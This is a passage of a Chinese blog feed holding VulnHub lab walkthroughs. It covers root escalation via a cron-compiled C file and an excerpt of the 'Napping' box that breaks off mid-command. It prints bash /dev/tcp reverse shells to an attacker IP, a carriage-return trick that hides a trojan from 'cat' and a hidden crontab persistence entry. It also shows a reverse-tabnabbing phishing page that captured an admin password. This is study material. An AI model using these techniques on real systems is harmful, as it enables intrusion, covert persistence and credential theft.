&lt;p&gt;我们只需要再次输入 python3 -c ‘import pty;pty.spawn (&amp;quot;/bin/bash&amp;quot;)’, 即可获得一个标准化的终端&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-219.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;pspy64s-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64s-监控&#34;&gt;#&lt;/a&gt; pspy64s 监控&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;寻找一些ippsec可以访问的东西&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group ippsec -type d 2&amp;gt;/dev/null | grep -v proc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-220.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现我们可以访问位于 wordpress 目录中的 .git 目录&lt;br&gt;
我们的终端一直在弹出消息，而且这个消息是在 ippsec 上执行的&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;现在我们可以运行pspy64s检查 Red 是否正在执行我们在/var/www/wordpress/.git 目录中找到的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-221.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到 /usr/bin/gcc/var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev 被执行&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-222.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在我们已经很明确了，supersecretfileuc.c 这个文件会被执行&lt;br&gt;
而且是调用 root 权限去执行的这个文件，需要一个 c 的反弹 shell 的代码&lt;/p&gt;
&lt;h3 id=&#34;各种语言反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#各种语言反弹&#34;&gt;#&lt;/a&gt; 各种语言反弹&lt;/h3&gt;
&lt;p&gt;各种语言反弹 shell 的代码：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1JldmVyc2UlMjBTaGVsbCUyMENoZWF0c2hlZXQubWQjYw==&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#c&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;重新编辑 supersecretfileuc.c 这个文件&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-223.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;并在 4444 端口出监听&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-224.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 至此拿到了 root 权限，提权成功&lt;/p&gt;
&lt;h3 id=&#34;cat配合cron维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat配合cron维权&#34;&gt;#&lt;/a&gt; cat 配合 cron 维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;编写python程序显示如下内容：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;evil = &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;normal = &amp;quot;echo &amp;#x27;Hello world!&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with open(&amp;quot;/root/.test.sh&amp;quot;, &amp;quot;w&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	output = &amp;quot;#!/bin/bash\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	output += normal + &amp;quot;;&amp;quot; + evil + &amp;quot; #\r&amp;quot; + normal + &amp;quot; &amp;quot; * (len(evil) + 3) + &amp;quot;\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	f.write(output)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-225.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/1.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-226.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用py执行此文件后，会生成 /root/.test.sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;看的时候看不到 payload，但使用more 或者 &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; -A 就会暴露&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f 1.py &amp;amp;&amp;amp; chmod +x /root/.test.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv /root/test.sh /root/.test.sh &amp;amp;&amp;amp; /root/.test.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-227.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;成功反弹出去，实现了cat隐藏木马,将此文件加入到计划文件中：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(crontab - l;printf &amp;quot;*/1 * * * * /root/.test.sh;\rno crontab for `whoami`%100c\n&amp;quot;)|crontab -&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-228.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; cron 中同样是被隐藏的计划任务，只要我们 nc -lvvp 4449 等待上线即可&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/102%20NAPPING/</id>
        <title>VULNHUB 2 NAPPING</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/102%20NAPPING/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbmFwcGluZy0xMDEsNzUyLw==&#34;&gt;https://www.vulnhub.com/entry/napping-101,752/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQuZ2l0bGFiLmlvL2hvbWUvdnVsbmh1Yi9uYXBwaW5nLw==&#34;&gt;https://readysetexploit.gitlab.io/home/vulnhub/napping/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-012.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;netdiscover 未发现目标主机，nmap 进一步扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-013.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.170&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.170 - oN /tmp/napping.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-014.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;钓鱼攻击web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#钓鱼攻击web&#34;&gt;#&lt;/a&gt; 钓鱼攻击 web&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcwLw==&#34;&gt;http://192.168.31.170/&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;观察页面可进行注册并且登陆账号&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-015.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-016.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;对此网站进行目录扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.170&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-017.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;3）观察登陆后的网站，发现存在跳转漏洞&lt;/p&gt;
&lt;p&gt;审查源代码之后，存在 target=’_blank’ 的代码，可进行利用&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-018.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;target=’_blank’漏洞利用：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3JldmVyc2UtdGFiLW5hYmJpbmc=&#34;&gt;https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-019.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 观察页面可知，管理员会执行页面上输入的 url 地址&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;接受访问着的用户名和密码并发送给 4444 端口，钓鱼管理员&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://192.168.31.170/index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat index.php &amp;amp;&amp;amp; mv index.php index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-020.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在该站点表明该页面的管理员将查看我们的链接，管员看到的是我们伪造的和对方 index.html 一样的界面，管员有可能认为自己的账号被注销会重新输入账户密码，而由于这是我们构造的界面，对方输入的信息将会被我们所监听。&lt;/p&gt;
&lt;p&gt;evil.html 的作用是重定向，本来的网址是 http://192.168.31.135/evil.html 但是访问&lt;br&gt;
的这个文件之后将被重定向为 http://192.168.31.135:4444/index.html&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; evil.html &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;title&amp;gt;My Blog&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(window.opener)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      window.opener.parent.location.replace(&amp;#x27;http://192.168.31.135:4444/index.html&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(window.opener != window)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      window.opener.parent.location.replace(&amp;#x27;http://192.168.31.135:4444/index.html&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-021.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提交指向我们 evil.html 链接&lt;br&gt;
然后点击链接&lt;br&gt;
我们将转到我们的 evil.html&lt;br&gt;
 但是原始标签将转到我们的 index.html，它看起来与登录页面完全相同&lt;br&gt;
确保 Python 服务器在端口 80 和 4444 上运行&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;钓鱼攻击，等待鱼儿上钩&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;启动 80 端口的 http 服务: python3 -m http.server 80&lt;br&gt;
 开启 80 服务后，对方可以访问到 http://192.168.31.135/evil.html 并且访问的这&lt;br&gt;
个文件之后将被重定向为 http://192.168.31.135:4444/index.html&lt;/p&gt;
&lt;p&gt;-&amp;gt; 我们从 4444 端口处监听以便捕捉到对方的用户名和密码！&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-022.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;nc -lvvp 4444&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-023.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获得管理员账户：daniel 密码：C@ughtm3napping&lt;br&gt;
 注意这里的 %40 是 url 编码的 @&lt;/p&gt;
&lt;h3 id=&#34;定时任务反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务反弹shell&#34;&gt;#&lt;/a&gt; 定时任务反弹 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;得到账号密码，可以登入服务器，ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmRhbmllbEAxOTIuMTY4LjMxLjE3MA==&#34;&gt;daniel@192.168.31.170&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-024.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;观察 /home 文件，分析可提权的文件&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat query.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat site_status.txt | head -n 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tail -n 10 site_status.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-025.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对方有一个定时任务，用来检测网站是否正常，如果正常的话，会将日志打印出来，这里我们以 adrian 这个用户执行反弹该用户权限的 shell.&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/dev/shm/是linux下一个非常有用的目录，因为这个目录不在硬盘上，而是在内存里。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /dev/shm/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /dev/shm/shell.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-026.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在query.py中添加此命令，用来执行反弹shell的命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; query.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;#x27;/usr/bin/bash 